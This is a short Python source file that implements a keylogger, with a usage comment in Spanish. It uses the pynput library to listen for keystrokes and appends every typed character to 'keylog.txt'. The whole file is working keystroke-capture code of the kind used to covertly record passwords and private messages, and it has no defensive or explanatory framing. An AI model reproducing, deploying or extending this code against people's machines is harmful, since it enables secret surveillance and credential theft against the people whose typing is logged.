from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        pass

def keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Uso: keylogger()
